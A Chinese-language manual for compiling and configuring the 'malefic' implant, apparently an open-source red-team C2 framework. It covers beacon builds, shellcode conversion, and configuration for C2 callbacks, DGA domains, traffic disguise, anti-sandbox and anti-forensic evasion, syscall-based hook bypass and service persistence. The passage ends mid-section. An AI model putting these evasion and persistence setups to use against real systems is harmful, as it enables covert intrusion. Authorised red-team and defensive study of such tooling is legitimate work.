---
title: IoM Implant 编译与配置手册
---

# IoM Implant 编译与配置完整手册

> 本手册涵盖 IoM 植入体的完整编译流程和详细配置说明，适用于从入门到高级的所有使用场景。

## 目录

- [快速开始](#快速开始)
- [第一部分：编译环境与架构支持](#第一部分编译环境与架构支持)
- [第二部分：编译方法](#第二部分编译方法)
- [第三部分：Mutant 工具](#第三部分mutant-工具)
- [第四部分：植入体配置详解](#第四部分植入体配置详解)

---

## 快速开始

### 快速编译你的第一个malefic(beacon)

如果你是第一次使用 IoM，推荐使用 Docker 编译方式：

```bash
# 1. Clone 源码（包含子模块）
git clone --recurse-submodules https://github.com/chainreactors/malefic

# 2. Docker 编译
docker run -v "$(pwd):/root/src" --rm -it ghcr.io/chainreactors/malefic-builder:latest sh -c "malefic-mutant generate beacon && malefic-mutant build malefic --target x86_64-pc-windows-gnu"
```

---

## 第一部分：编译环境与架构支持

### 1.1 支持的架构

malefic 理论上支持 rust 能编译的几乎所有平台，包括各种冷门架构的 IoT 设备, Android 系统, iOS 系统等等 (有相关需求可以联系我们定制化适配)，当前支持的架构可参考[cross-rust](https://github.com/chainreactors/cross-rust)

**经过测试的 target：**

- x86_64-apple-darwin
- aarch64-apple-darwin
- x86_64-unknown-linux-musl
- i686-unknown-linux-musl
- x86_64-pc-windows-msvc
- i686-pc-windows-msvc
- x86_64-pc-windows-gnu
- i686-pc-windows-gnu
- armv7-unknown-linux-musleabihf
- armv7-unknown-linux-musleabi

### 1.2 基础环境配置

#### Git Clone

因为 malefic 需要用到代码生成, 并鼓励用户修改代码, 因此我们没有将代码打包到 docker 中.

```bash
git clone --recurse-submodules https://github.com/chainreactors/malefic
```

!!! important "注意 clone 子项目"
	需要添加`--recurse-submodules`递归克隆子项目. 如果已经 clone 也不必担心,`git submodule update --init --recursive` 即可

#### 下载 resources

!!! tips "在一键安装时使用install.sh会自动下载resources"

[resources.zip](https://github.com/chainreactors/malefic/releases/latest), 包含了编译需要用到的预编译好的malefic-win-kit、rem等库文件.

community版本的resources随着malefic发布时的 release 发布: https://github.com/chainreactors/malefic/releases/latest 

resources下载解压后，目录结构如下:

![](/IoM/assets/Pasted%20image%2020241122223133.png)

---

## 第二部分：编译方法

### 2.1 Docker 编译（推荐）

!!! info "docker交叉编译镜像"
	[cross-rs/cross](https://github.com/cross-rs/cross)非常强大，它解决了Rust的编译环境安装复杂的一大难题，但是它会导入一些用户目录信息等，我们参考了cross的代码创建了用于维护malefic(即implant)编译的镜像仓库[chainreactors/cross-rust](https://github.com/chainreactors/cross-rust).
	    这个项目暂时提供了一些主流架构的编译环境的Dockerfile。

同标题所讲，使用该编译方法需要需要先安装Docker.

#### Docker Install

可参考[官网介绍](https://www.docker.com/)

```bash
# 国外安装请使用
curl -fsSL https://get.docker.com | sudo bash -s docker
# 国内安装请使用
curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun
```

#### 支持的镜像

目前已经支持的镜像:

- ghcr.io/chainreactors/x86_64-pc-windows-msvc:nightly-2023-09-18-latest
- ghcr.io/chainreactors/i686-pc-windows-msvc:nightly-2023-09-18-latest
- ghcr.io/chainreactors/i686-pc-windows-gnu:nightly-2023-09-18-latest
- ghcr.io/chainreactors/x86_64-pc-windows-gnu:nightly-2023-09-18-latest
- ghcr.io/chainreactors/x86_64-unknown-linux-musl:nightly-2023-09-18-latest
- ghcr.io/chainreactors/i686-unknown-linux-musl:nightly-2023-09-18-latest
- ghcr.io/chainreactors/x86_64-unknown-linux-gnu:nightly-2023-09-18-latest
- ghcr.io/chainreactors/i686-unknown-linux-gnu:nightly-2023-09-18-latest
- ghcr.io/chainreactors/x86_64-apple-darwin:nightly-2023-09-18-latest
- ghcr.io/chainreactors/aarch64-apple-darwin:nightly-2023-09-18-latest
- ...

!!! tips "镜像使用注意"
	ghcr.io/chainreactors/malefic-builder:latest是一个包含了win/linux/mac常用target的镜像. 如果了解rust的编译操作, 可以使用这个镜像实现大多数编译。(具体target有i686-pc-windows-gnu,x86_64-pc-windows-gnu,x86_64-unknown-linux-musl,i686-unknown-linux-musl,x86_64-apple-darwin,aarch64-apple-darwin)

#### 编译命令

!!! important "请注意已完成了基础环境配置"
	使用`install.sh` 安装的会自动配置对应的基础环境. 如果是手动配置请检查[基础环境配置](#12-基础环境配置)

以`x86_64-unknown-linux-musl`举例, **在 malefic 的代码根目录下执行**

你可以通过一行命令执行 build
```bash
# cd /user/path/malefic/
docker run -v "$(pwd):/root/src" --rm -it ghcr.io/chainreactors/malefic-builder:latest sh -c "malefic-mutant generate beacon && malefic-mutant build malefic --target x86_64-unknown-linux-musl"

# 如果不想每次都下载依赖, 可以把依赖进行本地的缓存，
docker run -v "$(pwd):/root/src" -v "$(pwd)/cache/registry:/root/cargo/registry" -v "$(pwd)/cache/git:/root/cargo/git" --rm -it ghcr.io/chainreactors/malefic-builder:latest sh -c "malefic-mutant generate beacon && malefic-mutant build malefic --target x86_64-unknown-linux-musl"
```

在 docker 中编译通过 volume 映射源码，编译完成会在`./target/<target_triple>/release/`目录下生成对应的二进制文件。

### 2.2 Github Action编译

我们在Github Action中也基于测试通过的镜像做了适配。

目前client+server已经内置了Github action编译的命令，你可通过在client端调用`action build --help`查看详细用法。 

接下来叙述如何手动通过gh编译。

首先, 你需要git clone一份malefic源码，并push到一份到你的仓库(建议设置私人仓库)，并开启github action功能，参考下图:

![](/IoM/assets/enable-github-action.png)

然后, 在本地安装[gh cli](https://docs.github.com/zh/github-cli/github-cli/quickstart)工具，通过设置`GH_TOKEN`环境变量或`gh auth login`登录你的github账号，然后执行如下命令即可编译.

注意: windows用户如果没有base64等函数，建议通过git-bash.exe执行.

#### 编译命令

1. **编译beacon**
```git-bash
gh workflow run generate.yaml -f package="beacon" -f malefic_config_yaml=$(base64 -w 0 </path/to/malefic_src/config.yaml>) -f remark="write somthing.." -f targets="x86_64-pc-windows-gnu" -R <username/malefic>
```

2. **编译bind**
```git-bash
gh workflow run generate.yaml -f package="beacon" -f malefic_config_yaml=$(base64 -w 0 </path/to/malefic_src/config.yaml>) -f remark="write somthing.." -f targets="x86_64-pc-windows-gnu" -R <username/malefic>
```

3. **编译 pulse**
```git-bash
gh workflow run generate.yaml -f package="pulse" -f malefic_config_yaml=$(base64 -w 0 </path/to/malefic_src/config.yaml>) -f remark="write somthing.." -f targets="x86_64-pc-windows-gnu" -R <username/malefic>
```

4. **编译prelude**
```git-bash
gh workflow run generate.yaml -f package="prelude" -f autorun_yaml=$(base64 -w 0 </path/to/malefic_src/autorun.yaml>) -f malefic_config_yaml=$(base64 -w 0 </path/to/malefic_src/config.yaml>) -f remark="write somthing.." -f targets="x86_64-pc-windows-gnu" -R <username/malefic>
```

5. **编译modules**
```git-bash
gh workflow run generate.yaml -f package="modules" -f malefic_modules_features="execute_powershell execute_assembl..." -f remark="write somthing.." -f targets="x86_64-pc-windows-gnu" -R <username/malefic>
```

编译完成后你可以通过`gh run list --workflow=generate.yaml -R <username/malefic>`查看编译结果，
通过`gh run download <run_id> -R <username/malefic>`下载对应的二进制文件.

![](/IoM/assets/gh-run-list-download.png)

### 2.3 本机编译

!!! danger "由于本地环境的编译更为复杂, 只建议有rust使用经验的用户采用"
	本机编译时交叉编译配置或者不同的target都可能有不同的环境依赖. 例如编译gnu相关需要依赖特定版本的gcc, 编译musl或者darwin也需要安装对应的环境。这些基础环境配置我们在docker里解决了一遍， **对于没有相关经验的使用者会非常劝退**。
	
	如果没有丰富的rust使用经验， 建议使用我们提前准备的docker/github aciton进行编译

#### 安装rust

**linux安装 rust**

```bash
curl https://sh.rustup.rs -sSf | sh
```

**windows安装rust**
三种方式选择一种即可:

1. 直接下载安装程序: 
https://www.rust-lang.org/tools/install 或使用包管理工具下载
2. scoop install
```bash
scoop install rustup
```
3. winget install
```bash
winget install rustup
```

#### 安装 toolchain

```bash
rustup default nightly-2023-09-18
```

#### 环境配置

!!! tips "交叉编译小技巧"
	使用手动交叉编译也可以使用[zigbuild](https://github.com/rust-cross/cargo-zigbuild)可以免去坑非常多的环境配置问题
	
	```
	pip install cargo-zigbuild
	```
	
	编译命令如下，以malefic beacon为例:
	
	```
	cargo zigbuild --release -p malefic --target x86_64-pc-windows-gnu
	cargo zigbuild --release -p malefic --target x86_64-unknown-linux-musl
	```

**linux环境配置**

```bash
sudo apt install -y openssl libssl-dev libudev-dev cmake llvm clang musl-tools build-essential
```

**windows环境配置**

??? "windows 配置msvc环境(使用x86_64-pc-windows-msvc必须)"
	请参考: https://rust-lang.github.io/rustup/installation/windows-msvc.html

??? "windows 配置 gnu 环境(如果使用x86_64-pc-windows-gnu必须)"
	本地手动编译时，我们推荐 windows 用户使用[msys2](https://www.msys2.org/)管理 GNU 工具链环境, 可通过官网二进制文件直接安装。
	
	在 msys2 的 terminal 执行如下安装可以保证 64、32 位 GNU 工具链的正常编译
	

	```
	pacman -Syy # 更新包列表
	pacman -S --needed mingw-w64-x86_64-gcc
	pacman -S --needed mingw-w64-i686-gcc
	```
	

	你可以把 msys64 添加到环境变量中， 或通过`notepad $PROFILE`将如下内容添加到 powershell 配置中，实现在 powershell 中快速切换`mingw64/32`.
	

	```powershell
	function mg {
		param (
			[ValidateSet("32", "64")]
			[string]$arch = "64"
		)
		
		$basePath = "D:\msys64\mingw" # 此处是你的msys2安装路径
		$env:PATH = "${basePath}${arch}\bin;" + $env:PATH
		Write-Host "Switched to mingw${arch} (bit) toolchain"
	}
	mg 64
	```
	
	用法参考下图:
	
	![switch mingw](/IoM/assets/switch-mingw-in-powershell.png)

#### 编译步骤

!!! important "本机安装请注意[下载resources](#下载-resources)并解压到指定目录"

此部分也可以使用make命令进行编译, 与前文Makefile一致

**编译 malefic**

项目的配置(.cargo/config.toml、cargo.toml、Makefile)中提供了一些预设和编译优化选项. 熟悉 rust 的使用者也可以手动编译，malefic 目前使用的 rust 版本是`nightly-2023-09-18`.

在进行手动编译前， 请更改 `beacon/bind` 对应的配置项, 关于配置项， 请参考 [配置说明](#第四部分植入体配置详解)

添加对应的目标编译架构,以`x86_64-pc-windows-gnu`为例

```bash
rustup target add x86_64-pc-windows-gnu
```

**生成配置与代码**

编译mutant, 或从malefic release中下载编译好的mutant,[mutant 完整文档](#第三部分mutant-工具)

```bash
cargo build --release -p malefic-mutant
```

通过 mutant 生成对应的配置

```bash
# 生成 beacon 编译所需的配置和代码
./target/release/malefic-mutant generate beacon
# 生成 bind 编译所需的配置和代码
./target/release/malefic-mutant generate bind
```

指定 `target` 编译

```bash
# mg 64
cargo build --release -p malefic --target x86_64-pc-windows-gnu
# mg 32
cargo build --release -p malefic --target i686-pc-windows-gnu

# 如果你需要编译win7的target,请使用如下命令
cargo +nightly build --release -p malefic --target x86_64-win7-windows-msvc -Z build-std=std,panic_abort
```

**编译 malefic-prelude**

生成配置

```bash
malefic-mutant generate prelude autorun.yaml
```

```bash
cargo build --release -p malefic-prelude --target x86_64-pc-windows-gnu
```

**编译 malefic-pulse**

在进行手动编译前， 请更改 `pulse` 对应的配置项, 关于配置项， 请参考 [pulse 配置说明](#pulse配置)

```bash
malefic-mutant generate pulse
```

指定 `target ` 编译

```bash
# mg 64
cargo build -p malefic-pulse --target x86_64-pc-windows-gnu
# mg 32
cargo build -p malefic-pulse --target i686-pc-windows-gnu
```

生成对应的 `malefic-pulse.exe` 文件后，您可以使用 `objcopy` 来进行 `shellcode` 的转化

```bash
objcopy -O binary malefic-pulse.exe malefic-pulse.bin
```

**编译独立 modules**

malefic 的 windows 平台目前支持动态加载 module, 因此可以编译单个或者一组 module, 然后通过`load_module`给已上线的 implant 添加新的功能.

相关命令如下:

生成对应配置

```bash
malefic_mutant generate modules "execute_powershell execute_assembly"
```

编译 modules

```bash
malefic_mutant build modules --target x86_64-pc-windows-gnu
```

!!! info "当前支持的 modules"
	请见: https://chainreactors.github.io/wiki/IoM/manual/implant/modules/#modules

编译结果为`target\[arch]\release\modules.dll`

可以使用`load_module`热加载这个 dll

!!! important "module 动态加载目前只支持 windows"
	linux 与 mac 在理论上也可以实现, 将会随着对应的kit发布

常见的使用场景:

1.  编译一个不带任何 modules 的 malefic, 保持静态文件最小特征与最小体积. 通过`load_module modules.dll` 动态加载模块
2.  根据场景快速开发 module, 然后动态加载到 malefic 中.
3.  长时间保持静默的场景可以卸载所有的 modules, 并进入到 sleepmask 的堆加密状态. 等需要操作时重新加载 modules

---

## 第三部分：Mutant 工具

malefic 在v0.0.3中解耦为多个组件并新增了大量组件，可预见的将会有更多组件和模块出现在项目中， 因此配置生成/管理工具刻不容缓， 之前的 config 已经无法满足当前的需求， 我们新增了 malefic-mutant 代替原有的malefic-config

在设计中， mutant 的定位相当于 MSF venom， 可以动态解析和更改配置以动态生成代码， 也可以通过需求动态生成 shellcode 的 raw 文件.

### 3.1 Install/Build

malefic-mutant 会随着每个版本自动编译对应的release. 直接下载即可使用

https://github.com/chainreactors/malefic/releases/latest

也支持从源码编译:

```bash
cargo build --release -p malefic-mutant 
```

!!! tips "编译环境"
	编译环境可以参考build中对应的配置流程

### 3.2 Config

malefic-mutant 目前有三大组件:

* generate： 根据配置动态生成代码
* build：创建可用的 shellcode/PE 文件和编译
* tool: 一些可用的小工具（目前为srdi）

其中 generate 所依赖的配置均在 malefic/config.yaml 文件中

```bash
$ mutant --help
Config malefic beacon and prelude.

Usage: malefic-mutant.exe <COMMAND>

Commands:
  generate  auto generate config
  build     auto build
  tool
  help      Print this message or the help of the given subcommand(s)

Options:
  -h, --help  Print help
```

由于 beacon 是整个功能的结合形态， 因此配置项略微复杂， 这里将其分为三部分来介绍

配置文件模板: https://github.com/chainreactors/malefic/blob/master/config.yaml

### 3.3 generate

generate是代码, 配置, 编译条件的生成器, 因此需要在源代码目录下使用.

如果还没有下载对应的源代码, 请先尝试clone malefic.

```bash
git clone --recurse-submodules https://github.com/chainreactors/malefic
```

generate 模块将会根据配置动态生成一切所需的代码（pulse, prelude, beacon...）

在每次修改完implant的`config.yaml`后， 都需要重新执行 `malefic-mutant generate  ...` 生成对应的配置

#### beacon

```bash
Usage: malefic-mutant.exe generate beacon [OPTIONS]

Options:
  -v, --version <VERSION>  Choice professional or community [default: community] [possible values: community, professional, inner]
  -s, --source             enable build from source code
  -c, --config <CONFIG>    Config file path [default: config.yaml]
  -h, --help               Print help
```

**使用示例**

```bash
malefic-mutant generate beacon 
```

##### beacon prelude

beacon在v0.1.0中也支持[autorun](#autorun)了。 不在需要分阶段上线， 可以通过stageless实现同样的功能。 

可以在编译时编译到beacon中， 在beacon启动时自动执行预编排的任务。 

```yaml
implants:  
  ...
  autorun: "persistence.yaml"
```

persistence.yaml:
```yaml
-
  name: bof
  body: !ExecuteBinary
    name: addservice
    bin: !File "addservice.o"

```

#### pulse

pulse 作为目前的 shellcode 生成器， 由 mutant 通过解析配置来提供生成代码

#### prelude

prelude 为可选的用于在上线前进行权限维持, 反沙箱, 反调试等功能的中间阶段

**使用说明**

```bash
Config prelude

Usage: malefic-mutant.exe generate prelude [OPTIONS] <YAML_PATH>

Arguments:
  <YAML_PATH>

Options:
  --resources <RESOURCES>  Custom resources dir, default "./resources/" [default: resources]
  -h, --help                   Print help
```

这个yaml能被自动打包编译成`spite.bin`

```bash
malefic-mutant generate prelude autorun.yaml

cargo build -p malefic-prelude
```

能生成一个自动按顺序执行autorun.yaml 中配置的二进制程序.

#### bind (Unstable)

在当前实际对抗中, 受到网络环境的限制, 很少有人使用 bind 类型的 webshell. 但在一些极端场景下, 例如不出网的webshell 中, 又或者长时间流量静默的场景下. bind 也许有用武之地

bind 作为新增的临时解决方案, 也由 mutant 来进行调配

```bash
Config bind

Usage: malefic-mutant.exe generate bind [OPTIONS]

Options:
  -h, --help               Print help
```

### 3.4 build

在v0.1.0后， 为了方便ollvm的复杂参数配置， 我们添加了mutant build命令组, 用来通过mutant封装复杂编译参数， 减少用户侧的心智负担。

build 作为二进制文件生成器， 用于生成最终产物

```bash
auto build

Usage: malefic-mutant.exe build [OPTIONS] <COMMAND>

Commands:
  malefic  Build beacon
  prelude  Build prelude
  modules  Build modules
  pulse    Build pulse
  help     Print this message or the help of the given subcommand(s)

Options:
  -c, --config <CONFIG>  Config file path [default: config.yaml]
  -t, --target <TARGET>  [default: x86_64-pc-windows-gnu]
  -h, --help             Print help
```

#### malefic 

编译
```bash
Build beacon

Usage: malefic-mutant.exe build malefic [OPTIONS]

Options:
  -c, --config <CONFIG>  Config file path [default: config.yaml]
  -t, --target <TARGET>  [default: x86_64-pc-windows-gnu]
  -h, --help             Print help
```

示例

```bash
malefic-mutant.exe build malefic --target x86_64-pc-windows-msvc
```

**prelude/pulse/modules使用方法类似**

### 3.5 tool

```bash
Usage: malefic-mutant.exe tool <COMMAND>

Commands:
  srdi  Generate SRDI
  help  Print this message or the help of the given subcommand(s)

Options:
  -h, --help  Print help

```

#### SRDI

作为 PE2SHELLCODE 的常见解决方案， 该模块可以将我们的 prelude / beacon 转化为 shellcode 以供多段加载

```bash
Generate SRDI

Usage: malefic-mutant.exe tool srdi [OPTIONS]

Options:
  -t, --type <TYPE>                    Srdi type: link(not support TLS)/malefic(support TLS) [default: malefic]
  -i, --input <INPUT>                  Source exec path [default: ]
  -p, --platform <PLATFORM>            platform, win [default: win]
  -a, --arch <ARCH>                    Choice arch x86/x64 [default: x64]
  -o, --output <OUTPUT>                Target shellcode path [default: malefic.bin]
      --function-name <FUNCTION_NAME>  Function name [default: ]
      --userdata-path <USERDATA_PATH>  User data path [default: ]
  -h, --help                           Print help
```

使用示例：

```bash
malefic-mutant tool srdi -i ./beacon.exe

malefic-mutant tool srdi -i ./beacon.exe -a x64 -o ./beacon.bin

malefic-mutant tool srdi -i ./beacon.dll  --function-name "main"
```

---

## 第四部分：植入体配置详解

本部分详细介绍IoM植入体的配置选项，涵盖从基础通信设置到高级对抗技术的完整配置指南。

### 4.1 配置文件概述

IoM植入体配置主要分为三个部分：

- **basic**: 基础通信配置（连接、加密、重试等）
- **implants**: 植入体高级配置（模块、对抗、API等） 
- **build**: 编译构建配置（混淆、元数据、工具链等）

### 4.2 basic - 基础通信配置

#### 4.2.1 基本标识与网络配置

```yaml
basic:
  name: "malefic"                    # 植入体标识名称
  proxy:                             # 代理配置（可选）
    use_env_proxy: false             # 是否使用环境变量代理
    url: "http://127.0.0.1:8080"     # 代理服务器地址
  init_retry: 10                     # 初始注册最大重试次数
  server_retry: 10                   # 单服务器每轮最大重试次数  
  global_retry: 1000000              # 全局累计最大重试次数
```

**字段说明：**

- **name**: 植入体的唯一标识符，用于服务端识别和管理

- **proxy**: 代理配置对象，支持灵活的代理设置
  - **use_env_proxy**: 是否自动读取系统环境变量中的代理设置（如 `HTTP_PROXY`、`HTTPS_PROXY`）
    - `true`: 优先使用环境变量，如 `http_proxy`、`https_proxy` 等
    - `false`: 忽略环境变量，使用手动配置
  - **url**: 手动指定代理服务器地址，支持多种协议：
    - `http://proxy.example.com:8080` - HTTP代理
    - `https://proxy.example.com:8080` - HTTPS代理  
    - `socks5://proxy.example.com:1080` - SOCKS5代理

**代理配置示例：**

1. **使用环境变量代理（推荐企业环境）**：
```yaml
proxy:
  use_env_proxy: true        # 启用环境变量代理
  url: ""                    # 空值时才使用环境变量
```

2. **手动指定HTTP代理**：
```yaml
proxy:
  use_env_proxy: false
  url: "http://proxy.company.com:8080"
```

3. **使用认证代理**：
```yaml
proxy:
  use_env_proxy: false
  url: "http://username:password@proxy.example.com:8080"
```

4. **使用SOCKS5代理**：
```yaml
proxy:
  use_env_proxy: false
  url: "socks5://127.0.0.1:1080"
```

5. **禁用代理**：
```yaml
proxy:
  use_env_proxy: false       # 不使用环境变量
  url: ""                    # 空地址表示直连
```

6. **混合配置（主+备用）**：
```yaml
proxy:
  use_env_proxy: true        # 启用环境变量作为备选
  url: "http://primary.proxy.com:8080"  # 优先使用此代理
```

**优先级规则：**
- 优先使用 `url` 配置，如果 `url` 不为空，直接使用该代理地址
- 如果 `url` 为空且 `use_env_proxy: true`，则使用环境变量（如 `HTTP_PROXY`、`HTTPS_PROXY`、`ALL_PROXY`）
- 如果都为空，则直接连接目标服务器

**常见环境变量：**
- `HTTP_PROXY` - HTTP协议代理
- `HTTPS_PROXY` - HTTPS协议代理  
- `ALL_PROXY` - 所有协议通用代理
- `NO_PROXY` - 不使用代理的地址列表

#### 4.2.2 时序控制配置

```yaml
  cron: "*/5 * * * * * *"      # Cron 表达式：每5秒回连一次
  jitter: 0.2                  # 时间抖动系数（20%随机偏移）
```

**字段说明：**

- **cron**: 使用 Cron 表达式定义回连间隔，格式为 `秒 分 时 日 月 周 年`
- **jitter**: 抖动范围 (0.0-1.0)，避免规律性流量特征被检测

**常见 cron 配置示例：**

```yaml
cron: "*/30 * * * * * *"     # 每30秒
cron: "0 */5 * * * * *"      # 每5分钟整点
cron: "0 0 */2 * * * *"      # 每2小时整点
cron: "*/5 * 9-18 * * * *"   # 每天9-18点，每5秒执行一次
cron: "0 */10 8-20 * * 1-5 *" # 工作日8-20点，每10分钟
cron: "*/15 * 22-6 * * * *"   # 夜间22点-次日6点，每15秒
```

#### 4.2.3 通信加密配置

```yaml
  encryption: aes              # 加密算法选择
  key: "maliceofinternal"      # 加密密钥
```

**支持的加密算法：**

- **aes**: AES 对称加密，平衡安全性和性能
- **xor**: XOR 异或加密，最轻量但安全性较低
- **chacha20**: ChaCha20 流密码，高安全性

#### 4.2.4 安全通信配置

```yaml
  secure:
    enable: false                    # 启用高级安全通信
    private_key: ""                  # 植入体私钥
    public_key: ""                   # 服务器公钥
```

**字段说明：**

- **enable**: 是否启用基于公私钥的高级安全通信
- **private_key**: 植入体的私钥，用于身份验证和密钥交换
- **public_key**: 服务器的公钥，用于验证服务器身份和加密通信

#### 4.2.5 DGA（域名生成算法）配置

```yaml
  dga:
    enable: true                 # 启用 DGA 功能
    key: "malefic_dga_2024"      # DGA 种子密钥
    interval_hours: 8            # 域名更新间隔（小时）
```

**字段说明：**

- **enable**: 当主服务器不可达时，自动生成备用域名
- **key**: 影响域名生成算法的种子，确保 C2 服务器和植入体同步
- **interval_hours**: 域名轮换频率，建议 6-24 小时

#### 4.2.6 目标服务器配置

##### HTTP 连接配置

```yaml
targets:
  - address: "127.0.0.1:443"             # 服务器地址 (IP:端口)
    http:
      method: "POST"                     # HTTP 方法
      path: "/"                          # 请求路径
      version: "1.1"                     # HTTP 版本
      headers:                           # 自定义 HTTP 头
        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        Content-Type: "application/octet-stream"
    tls:
      enable: true                       # 启用 TLS 加密
      skip_verification: true            # 跳过证书验证
```

**字段说明：**

- **address**: 目标服务器的 IP 地址和端口
- **http**: HTTP 协议配置
  - **method**: HTTP 请求方法，推荐使用 `POST`（数据量大）或 `GET`（更隐蔽）
  - **path**: 请求路径，可模拟合法 Web 资源路径如 `/api/v1/data`、`/jquery.min.js`
  - **version**: HTTP 版本，通常使用 "1.1"
  - **headers**: 自定义 HTTP 头，User-Agent 应匹配目标环境的常见浏览器
- **tls**: TLS/SSL 配置（可选，与http同时使用时表示HTTPS）

##### 带域名的HTTPS连接配置

```yaml
targets:
  - address: "default.example.com:443"
    domain_suffix: "example.com"         # DGA域名后缀
    http:
      method: "POST"
      path: "/"
      version: "1.1" 
      headers:
        User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        Content-Type: "application/octet-stream"
    tls:
      enable: true                       # 启用 TLS 加密
      sni: "default.example.com"         # Server Name Indication
      skip_verification: true            # 跳过证书验证
```

**字段说明：**

- **domain_suffix**: DGA域名后缀，当默认服务器无法连接时，使用DGA模式生成新域名
- **tls**: TLS/SSL 配置
  - **enable**: 启用 TLS/SSL 加密传输
  - **sni**: 用于 TLS 握手的服务器名称，支持域名前置等技术
  - **skip_verification**: 
    - `false`: 验证服务器证书（推荐，更可信）
    - `true`: 跳过验证（适用于自签名证书或测试环境）

##### mTLS（双向认证）配置

```yaml
targets:
  - address: "secure.example.com:443"
    http:
      method: "POST"
      path: "/secure-api"
      version: "1.1"
      headers:
        User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        Content-Type: "application/octet-stream"
    tls:
      enable: true
      sni: "secure.example.com"
      skip_verification: false
      mtls:
        server_ca: "/path/to/ca.crt"      # CA 根证书路径
        client_cert: "/path/to/client.crt" # 客户端证书路径  
        client_key: "/path/to/client.key"  # 客户端私钥路径
```

##### TCP 连接配置

```yaml
targets:
  - address: "127.0.0.1:5001"            # TCP 服务器地址
    tcp: {}                              # 原始 TCP 连接
```

##### TCP + TLS 配置  

```yaml
targets:
  - address: "127.0.0.1:5001"
    tcp: {}
    tls:
      enable: true
      sni: "cdn.jquery.com"
      skip_verification: true
```

##### REM 协议配置

```yaml
targets:
  - address: "127.0.0.1:34996"           # REM 服务器地址
    rem:
      link: "tcp://nonenonenonenone:@127.0.0.1:12345?wrapper=lsJy"
```

**REM 协议说明：**

- REM 是 IoM 的自定义协议，支持更灵活的流量伪装
- `link` 格式：`[transport]://[key]:@[host]:[port]?wrapper=[]&tls=[bool]&tlsintls=[bool]&compress=[bool]`，详情请参考[REM用法文档](https://wiki.chainreactors.red/rem/usage/#console)

##### 多服务器配置

植入体支持多个备用服务器，按照 YAML 列表顺序进行轮换：

!!! tips "多服务器的配置目前仅支持单一协议通信"
    目前我们使用feature严格控制文件大小，后续优化后会支持多协议多服务器的配置

```yaml
targets:
  # 主服务器 - HTTP
  - address: "primary.example.com:80"
    http:
      method: "GET"
      path: "/search"
      version: "1.1"
      headers:
        User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        
  # 备用服务器 - HTTPS  
  - address: "backup.example.com:443"
    http:
      method: "POST"
      path: "/api/sync"
      version: "1.1"
      headers:
        User-Agent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
        Content-Type: "application/json"
    tls:
      enable: true
      sni: "backup.example.com"
      skip_verification: false
      
```

**多服务器轮换逻辑：**

1. 按照配置顺序依次尝试连接
2. 单个服务器失败时，根据 `server_retry` 设置重试
3. 所有服务器都失败时，如果启用了 DGA，将生成新的域名重试
4. 达到 `global_retry` 限制后停止重试

### 4.3 implants - 植入体高级配置

#### 4.3.1 基础运行时配置

```yaml
implants:
  runtime: tokio          # async runtime: smol/tokio/async-std
  mod: beacon             # malefic mod: beacon/bind
  register_info: true     # whether collect sysinfo when register
  hot_load: true          # enable hot load module
```

**字段解释：**

- **runtime**: 异步运行时框架，可选 `smol`/`tokio`/`async-std`。`tokio` 是最成熟的选择，性能和生态最好。
- **mod**: 植入体工作模式，`beacon`（回连模式）或 `bind`（监听模式）。
- **register_info**: 是否在首次连接时收集目标系统信息（OS版本、硬件等）。
- **hot_load**: 是否支持运行时动态加载新模块，提升灵活性但略增复杂度。

#### 4.3.2 模块管理配置

```yaml
  modules:                # module when malefic compile
    - "nano"
  enable_3rd: false       # enable 3rd module
  3rd_modules:            # 3rd module when malefic compile
    #    - curl
    #    - rem_static
    - full
```

**字段解释：**

- **modules**: 编译时静态链接的内置模块列表。`nano` 是轻量级基础模块。还有全部常见功能的full、支持基础操作的base等
- **enable_3rd**: 是否启用第三方模块支持，`false` 时忽略 `3rd_modules`。
- **3rd_modules**: 第三方模块列表，`full` 表示包含所有可用模块；具体模块如 `curl`（HTTP客户端）、`rem_static`（静态REM协议）。

#### 4.3.3 文件打包与标识配置

```yaml
  autorun: ""             # autorun config filename
  pack:                   # pack
  #    - src: "1.docx"
  #      dst: "1.docs"
  flags:
    start: 0x41
    end: 0x42
    magic: "beautiful"
    artifact_id: 0x1
```

**字段解释：**

- **autorun**: 自动执行脚本的配置文件名，留空则无自动执行。
- **pack**: 将外部文件打包到植入体中，`src` 是源文件，`dst` 是植入体内路径。
- **flags**: 植入体标识配置
  - **start/end**: 数据段标记字节，用于定位植入体数据边界
  - **magic**: 魔术字符串，用于验证植入体完整性
  - **artifact_id**: 构建产物唯一标识，便于管理多个变种

#### 4.3.4 反检测与对抗配置

```yaml
  # for professional
  anti: # 反沙箱反调试反编译反取证相关
    sandbox: false
    vm: false            # enable anti vm
    # debug: true         # enable anti debug
    # disasm: true        # enable anti disasm
    # emulator: true      # enable anti emulator
    # forensic: true      # enable anti forensic
```

**字段解释：**

- **sandbox**: 反沙箱检测，检测动态分析环境并退出或改变行为
- **vm**: 反虚拟机检测，识别 VMware/VirtualBox 等虚拟化环境
- **debug**: 反调试检测，阻止调试器附加或检测调试状态
- **disasm**: 反反汇编，增加静态分析难度
- **emulator**: 反模拟器，检测 QEMU 等模拟环境
- **forensic**: 反取证，对抗内存取证和磁盘分析

#### 4.3.5 API 调用策略配置

```yaml
  apis:
    # apis_level: "sys_apis", "nt_apis"
    level: "nt_apis"
    # apis_priority: "normal", "user_defined_dyanmic", "func_syscall" "syscalls"
    priority:
      normal:
        enable: false
        type: "normal"
      dynamic:
        enable: true
        # type: "sys_dynamic", "user_defined_dynamic"
        type: "user_defined_dynamic"
      syscalls:
        enable: false
        # type: "func_syscall", "inline_syscall"
        type: "inline_syscall"
```

**字段解释：**

- **level**: API 调用层级，`sys_apis`（系统API）或 `nt_apis`（内核API）。`nt_apis` 更底层，bypass 能力更强。
- **priority**: API 调用优先级策略
  - **normal**: 直接调用 Windows API，最简单但最容易被 hook
  - **dynamic**: 动态解析API，`user_defined_dynamic` 表示自定义动态加载方式，增强隐蔽性
  - **syscalls**: 直接系统调用，`inline_syscall` 内联汇编调用，bypass 能力最强但兼容性要求高

#### 4.3.6 内存分配与执行配置

```yaml
  alloctor:
    # inprocess: "VirtualAlloc", "VirtualAllocEx",
    #            "VirtualAllocExNuma", "HeapAlloc",
    #            "NtMapViewOfSection", "NtAllocateVirtualMemory"
